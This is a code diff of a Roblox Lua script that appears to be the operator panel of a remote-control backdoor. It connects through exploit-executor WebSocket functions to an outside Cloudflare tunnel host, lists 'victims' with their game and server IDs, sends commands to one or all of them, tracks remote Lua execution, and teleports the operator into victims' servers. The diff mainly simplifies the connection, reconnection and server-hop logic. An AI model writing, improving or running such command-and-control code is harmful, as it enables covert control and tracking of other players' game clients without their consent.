@@ -4,17 +4,7 @@ local Players = game:GetService("Players")
 local TeleportService = game:GetService("TeleportService")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
-
-local LocalPlayer = Players.LocalPlayer
-if not LocalPlayer then
-    local t = 0
-    while not LocalPlayer and t < 10 do
-        task.wait(0.1)
-        LocalPlayer = Players.LocalPlayer
-        t = t + 0.1
-    end
-end
-if not LocalPlayer then return end
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
 
 local WS_URL = "wss://outsourcing-poetry-alternatively-sonic.trycloudflare.com"
 pcall(function()
@@ -27,58 +17,11 @@ pcall(function()
     end
 end)
 
-local function getWSConnector()
-    local list = {
-        WebSocket,
-        websocket,
-        (getgenv and getgenv().WebSocket),
-        (getgenv and getgenv().websocket),
-        (syn and syn.websocket),
-        (syn and syn.WebSocket),
-    }
-    for _, item in ipairs(list) do
-        if type(item) == "table" then
-            if type(item.connect) == "function" then return item.connect end
-            if type(item.Connect) == "function" then return item.Connect end
-        elseif type(item) == "function" then
-            return item
-        end
-    end
-    return nil
-end
-
-local WS_Connect = getWSConnector()
-
-local function safeSend(s, msg)
-    if not s then return false end
-    local ok = pcall(function() s:Send(msg) end)
-    return ok
-end
-
-local function safeClose(s)
-    if not s then return end
-    pcall(function() s:Close() end)
-end
-
-local function setupEvents(s, onMsg, onClose)
-    pcall(function() s.OnMessage:Connect(onMsg) end)
-    pcall(function() s.OnClose:Connect(onClose) end)
-end
-
-local function tryOpenWS(url)
-    if not WS_Connect then return nil end
-    local ok, s = pcall(function()
-        return WS_Connect(url, {
-            ["User-Agent"] = "Roblox/WinInet"
-        })
-    end)
-    if ok and s then return s end
-    local ok2, s2 = pcall(function()
-        return WS_Connect(url)
-    end)
-    if ok2 and s2 then return s2 end
-    return nil
-end
+local WS_Connect = (WebSocket and WebSocket.connect)
+    or (websocket and websocket.connect)
+    or (syn and syn.websocket and syn.websocket.connect)
+    or (getgenv and getgenv().WebSocket and getgenv().WebSocket.connect)
+    or (getgenv and getgenv().websocket and getgenv().websocket.connect)
 
 local connectedVictims = {}
 local selectedVictim = "TODOS"
@@ -86,8 +29,6 @@ local wsConnected = false
 local currentSocket = nil
 local isHopping = false
 local isExecutingLua = false
-local isConnecting = false
-local connectingStartTime = 0
 
 local safeParent = LocalPlayer:WaitForChild("PlayerGui")
 
@@ -429,9 +370,7 @@ local InfoBarText = Instance.new("TextLabel")
 InfoBarText.Size = UDim2.new(1, -10, 1, 0)
 InfoBarText.Position = UDim2.new(0, 6, 0, 0)
 InfoBarText.BackgroundTransparency = 1
-local curJobShort = string.sub(tostring(game.JobId or ""), 1, 8)
-if #curJobShort > 0 then curJobShort = curJobShort .. ".." else curJobShort = "?" end
-InfoBarText.Text = string.format("Mi Place: %s | GameId: %s | Job: %s", tostring(game.PlaceId), tostring(game.GameId), curJobShort)
+InfoBarText.Text = string.format("Mi Place: %s | GameId: %s", tostring(game.PlaceId), tostring(game.GameId))
 InfoBarText.TextColor3 = Color3.fromRGB(180, 170, 210)
 InfoBarText.Font = Enum.Font.Code
 InfoBarText.TextSize = 9
@@ -467,94 +406,80 @@ local VictimsLayout = Instance.new("UIListLayout")
 VictimsLayout.Padding = UDim.new(0, 4)
 VictimsLayout.Parent = VictimsScroll
 
-local function forceResetConnecting()
-    isConnecting = false
-    connectingStartTime = 0
-end
-
+local isConnecting = false
 local function connectWS()
-    if isConnecting then
-        if (tick() - connectingStartTime) > 6 then
-            forceResetConnecting()
-        else
-            return false
-        end
-    end
+    if isConnecting then return end
     isConnecting = true
-    connectingStartTime = tick()
 
-    if currentSocket then
-        safeClose(currentSocket)
-    end
+    pcall(function()
+        if currentSocket then currentSocket:Close() end
+    end)
     currentSocket = nil
     wsConnected = false
 
     if not WS_Connect then
         StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Sin WS"
         StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
-        forceResetConnecting()
+        isConnecting = false
         return false
     end
 
-    local s = tryOpenWS(WS_URL)
-    if s then
+    local ok, s = pcall(function() return WS_Connect(WS_URL) end)
+    if ok and s then
         currentSocket = s
         wsConnected = true
-        StatusBadge.Text = "\xF0\x9F\x9F\xA2 Conectado (Cloudflare)"
+        StatusBadge.Text = "\xF0\x9F\x9F\xA2 Conectado"
         StatusBadge.TextColor3 = Color3.fromRGB(80, 255, 120)
 
-        setupEvents(s, function(msg)
-            local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
-            if success and data and (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
-                connectedVictims[data.username] = {
-                    username = data.username,
-                    placeId = data.placeId,
-                    gameId = data.gameId,
-                    jobId = data.jobId,
-                    lastSeen = tick()
-                }
-                if rebuildVictimsUI then rebuildVictimsUI() end
-            end
-        end, function()
-            wsConnected = false
-            currentSocket = nil
-            StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
-            StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+        pcall(function()
+            s.OnMessage:Connect(function(msg)
+                local success, data = pcall(function() return HttpService:JSONDecode(msg) end)
+                if success and data and (data.type == "victim_joined" or data.type == "victim_ping") and data.username then
+                    connectedVictims[data.username] = {
+                        username = data.username,
+                        placeId = data.placeId,
+                        gameId = data.gameId,
+                        jobId = data.jobId,
+                        lastSeen = tick()
+                    }
+                    if rebuildVictimsUI then rebuildVictimsUI() end
+                end
+            end)
         end)
 
-        safeSend(s, HttpService:JSONEncode({type = "ping_victims"}))
+        pcall(function()
+            s.OnClose:Connect(function()
+                wsConnected = false
+                currentSocket = nil
+                StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
+                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+            end)
+        end)
 
-        forceResetConnecting()
+        pcall(function()
+            s:Send(HttpService:JSONEncode({type = "ping_victims"}))
+        end)
+
+        isConnecting = false
         return true
     end
 
     wsConnected = false
     StatusBadge.Text = "\xF0\x9F\x94\xB4 Desconectado"
     StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
-    forceResetConnecting()
+    isConnecting = false
     return false
-end
-
-local function ensureWS()
-    if wsConnected and currentSocket then return true end
-    connectWS()
-    local waited = 0
-    while (not wsConnected or not currentSocket) and waited < 3 do
-        task.wait(0.2)
-        waited = waited + 0.2
-    end
-    return wsConnected and currentSocket ~= nil
 end
 
 TeleportService.TeleportInitFailed:Connect(function(player, result, msg)
     isHopping = false
-    local reason = tostring(msg or result or "Rechazado")
-    StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Hop fail: " .. string.sub(reason, 1, 30)
+    StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error TP: " .. tostring(msg or result or "Rechazado")
     StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
-    forceResetConnecting()
     task.spawn(function()
-        task.wait(0.5)
-        connectWS()
+        task.wait(1)
+        if not wsConnected or not currentSocket then
+            connectWS()
+        end
     end)
 end)
 
@@ -569,110 +494,29 @@ local function hopServer(placeId, jobId)
     end
 
     isHopping = true
-
-    if game.PlaceId ~= pid then
-        StatusBadge.Text = "\xF0\x9F\x8E\xAE Cambiando de juego..."
-        StatusBadge.TextColor3 = Color3.fromRGB(140, 200, 255)
-        task.spawn(function()
-            local ok, err = pcall(function()
-                TeleportService:Teleport(pid, LocalPlayer)
-            end)
-            if not ok then
-                StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error: " .. string.sub(tostring(err), 1, 30)
-                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
-            end
-            task.wait(6)
-            isHopping = false
-            forceResetConnecting()
-            if not wsConnected or not currentSocket then
-                connectWS()
-            end
-        end)
-        return
-    end
-
-    StatusBadge.Text = "\xF0\x9F\x94\x8D Verificando servidor..."
-    StatusBadge.TextColor3 = Color3.fromRGB(200, 200, 100)
+    StatusBadge.Text = "\xF0\x9F\x9A\x80 Entrando a instancia..."
+    StatusBadge.TextColor3 = Color3.fromRGB(140, 200, 255)
 
     task.spawn(function()
-        local serverOk = false
-        local checkErr = nil
-
-        pcall(function()
-            local url = "https://games.roblox.com/v1/games/" .. tostring(pid) .. "/servers/Public?limit=100"
-            local raw = game:HttpGet(url)
-            local parsed = HttpService:JSONDecode(raw)
-            if parsed and parsed.data then
-                for _, srv in ipairs(parsed.data) do
-                    if srv.id == jid then
-                        if srv.playing and srv.maxPlayers and srv.playing < srv.maxPlayers then
-                            serverOk = true
-                        else
-                            checkErr = "Servidor lleno (" .. tostring(srv.playing) .. "/" .. tostring(srv.maxPlayers) .. ")"
-                        end
-                        break
-                    end
-                end
-                if not serverOk and not checkErr then
-                    local cursor = parsed.nextPageCursor
-                    local pages = 0
-                    while cursor and pages < 3 and not serverOk do
-                        pages = pages + 1
-                        local url2 = "https://games.roblox.com/v1/games/" .. tostring(pid) .. "/servers/Public?limit=100&cursor=" .. cursor
-                        local raw2 = game:HttpGet(url2)
-                        local p2 = HttpService:JSONDecode(raw2)
-                        if p2 and p2.data then
-                            for _, srv in ipairs(p2.data) do
-                                if srv.id == jid then
-                                    if srv.playing and srv.maxPlayers and srv.playing < srv.maxPlayers then
-                                        serverOk = true
-                                    else
-                                        checkErr = "Servidor lleno"
-                                    end
-                                    break
-                                end
-                            end
-                            cursor = p2.nextPageCursor
-                        else
-                            break
-                        end
-                    end
-                end
+        if game.PlaceId == pid then
+            local tpOk, tpErr = pcall(function()
+                TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
+            end)
+            if not tpOk then
+                StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Teleport fall\xC3\xB3: " .. tostring(tpErr)
+                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
             end
-        end)
-
-        if not serverOk and not checkErr then
-            serverOk = true
-            checkErr = nil
+        else
+            local tpOk, tpErr = pcall(function()
+                TeleportService:Teleport(pid, LocalPlayer)
+            end)
+            if not tpOk then
+                StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F Error TP: " .. tostring(tpErr or "Fall\xC3\xB3")
+                StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
+            end
         end
-
-        if not serverOk and checkErr then
-            StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F " .. checkErr
-            StatusBadge.TextColor3 = Color3.fromRGB(255, 170, 0)
-            isHopping = false
-            return
-        end
-
-        StatusBadge.Text = "\xF0\x9F\x9A\x80 Teleportando..."
-        StatusBadge.TextColor3 = Color3.fromRGB(140, 200, 255)
-
-        local tpOk, tpErr = pcall(function()
-            TeleportService:TeleportToPlaceInstance(pid, jid, LocalPlayer)
-        end)
-
-        if not tpOk then
-            StatusBadge.Text = "\xE2\x9A\xA0\xEF\xB8\x8F TP Error: " .. string.sub(tostring(tpErr), 1, 30)
-            StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
-            isHopping = false
-            forceResetConnecting()
-            task.wait(1)
-            connectWS()
-            return
-        end
-
-        task.wait(6)
+        task.wait(5)
         isHopping = false
-        forceResetConnecting()
         if not wsConnected or not currentSocket then
             connectWS()
         end
@@ -680,7 +524,15 @@ local function hopServer(placeId, jobId)
 end
 
 local function sendCmd(action, extra)
-    if not ensureWS() then
+    if not wsConnected or not currentSocket then
+        connectWS()
+        local waited = 0
+        while (not wsConnected or not currentSocket) and waited < 3 do
+            task.wait(0.2)
+            waited = waited + 0.2
+        end
+    end
+    if not currentSocket or not wsConnected then
         StatusBadge.Text = "\xF0\x9F\x94\xB4 No hay conexi\xC3\xB3n"
         StatusBadge.TextColor3 = Color3.fromRGB(255, 100, 100)
         return false
@@ -696,15 +548,14 @@ local function sendCmd(action, extra)
         for k, v in pairs(extra) do payload[k] = v end
     end
     local raw = HttpService:JSONEncode(payload)
-    local ok = safeSend(currentSocket, raw)
+    local ok = pcall(function() currentSocket:Send(raw) end)
     if not ok then
         wsConnected = false
         currentSocket = nil
-        forceResetConnecting()
         connectWS()
         task.wait(0.4)
         if currentSocket and wsConnected then
-            safeSend(currentSocket, raw)
+            pcall(function() currentSocket:Send(raw) end)
         end
     end
     return ok
@@ -846,7 +697,9 @@ rebuildVictimsUI()
 local function refreshList()
     if not wsConnected then connectWS() end
     if currentSocket and wsConnected then
-        safeSend(currentSocket, HttpService:JSONEncode({type = "ping_victims"}))
+        pcall(function()
+            currentSocket:Send(HttpService:JSONEncode({type = "ping_victims"}))
+        end)
     end
     task.wait(0.8)
     local now = tick()
@@ -1097,20 +950,17 @@ task.spawn(function()
     connectWS()
     task.wait(1)
     refreshList()
-end)
-
-task.spawn(function()
     while true do
-        task.wait(4)
+        task.wait(15)
         if not wsConnected or not currentSocket then
-            forceResetConnecting()
             connectWS()
         else
-            local pingOk = safeSend(currentSocket, HttpService:JSONEncode({type = "ping"}))
+            local pingOk = pcall(function()
+                currentSocket:Send(HttpService:JSONEncode({type = "ping"}))
+            end)
             if not pingOk then
                 wsConnected = false
                 currentSocket = nil
-                forceResetConnecting()
                 connectWS()
             end
         end
